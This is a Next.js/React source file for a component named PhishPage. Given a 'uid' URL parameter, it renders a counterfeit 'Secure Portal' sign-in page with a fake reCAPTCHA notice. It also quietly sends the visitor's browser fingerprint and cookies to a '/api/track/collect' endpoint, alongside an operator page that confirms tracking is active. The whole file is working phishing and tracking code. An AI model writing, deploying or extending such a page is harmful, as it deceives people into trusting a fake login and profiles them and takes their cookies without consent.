import { useState, useEffect } from 'react';
import Head from 'next/head';

export default function PhishPage() {
  const [userId, setUserId] = useState('');
  const [submitted, setSubmitted] = useState(false);
  const [error, setError] = useState('');

  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const uid = params.get('uid');
    if (uid) {
      setUserId(uid);
      collectData(uid);
    }
  }, []);

  const collectData = async (uid) => {
    try {
      const screenData = {
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        colorDepth: window.screen.colorDepth,
        language: navigator.language,
        platform: navigator.platform,
        cookies: document.cookie ? Object.fromEntries(
          document.cookie.split(';').map(c => c.trim().split('='))
        ) : {}
      };

      await fetch('/api/track/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: uid,
          ...screenData
        })
      });
    } catch (err) {
      console.error('Track error:', err);
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setError('');

    if (!userId.trim()) {
      setError('Please enter User ID');
      return;
    }

    try {
      const res = await fetch('/api/track/collect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          userId: userId.trim(),
          screenResolution: `${window.screen.width}x${window.screen.height}`,
          language: navigator.language,
          platform: navigator.platform,
          cookies: {}
        })
      });

      const data = await res.json();

      if (data.success) {
        setSubmitted(true);
      } else {
        setError(data.error || 'Tracking failed');
      }
    } catch (err) {
      setError('Connection error');
    }
  };

  // If userId is provided in URL, show a fake login page
  if (userId) {
    return (
      <div className="min-h-screen bg-gray-100 flex items-center justify-center p-4">
        <Head>
          <title>Sign In - Secure Portal</title>
        </Head>

        <div className="w-full max-w-sm">
          <div className="bg-white rounded-lg shadow-lg p-8">
            <div className="text-center mb-6">
              <h1 className="text-2xl font-bold text-gray-900">Sign In</h1>
              <p className="text-gray-500 mt-1">to continue to Portal</p>
            </div>

            <form onSubmit={(e) => { e.preventDefault(); collectData(userId); }} className="space-y-4">
              <div>
                <input
                  type="email"
                  className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Email address"
                  required
                />
              </div>
              <div>
                <input
                  type="password"
                  className="w-full px-4 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                  placeholder="Password"
                  required
                />
              </div>
              <button
                type="submit"
                className="w-full py-3 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-lg"
              >
                Sign In
              </button>
            </form>

            <p className="text-center text-sm text-gray-500 mt-6">
              Protected by reCAPTCHA • Privacy • Terms
            </p>
          </div>
        </div>
      </div>
    );
  }

  // Direct access page
  return (
    <div className="min-h-screen bg-gray-950 flex items-center justify-center p-4">
      <Head>
        <title>Tracker - Direct Access</title>
      </Head>

      <div className="w-full max-w-md">
        <div className="bg-gray-900 border border-gray-800 rounded-2xl p-8">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-white">Enter User ID</h1>
            <p className="text-gray-400 mt-2">or use URL with ?uid= parameter</p>
          </div>

          {!submitted ? (
            <form onSubmit={handleSubmit} className="space-y-4">
              <input
                type="text"
                value={userId}
                onChange={(e) => setUserId(e.target.value)}
                className="w-full px-4 py-3 bg-gray-800 border border-gray-700 rounded-xl text-white"
                placeholder="User ID"
              />
              {error && (
                <p className="text-red-400 text-sm">{error}</p>
              )}
              <button
                type="submit"
                className="w-full py-3 bg-red-600 hover:bg-red-700 text-white font-semibold rounded-xl"
              >
                Submit
              </button>
            </form>
          ) : (
            <div className="text-center text-green-400">
              ✅ Tracking active
            </div>
          )}
        </div>
      </div>
    </div>
  );
}
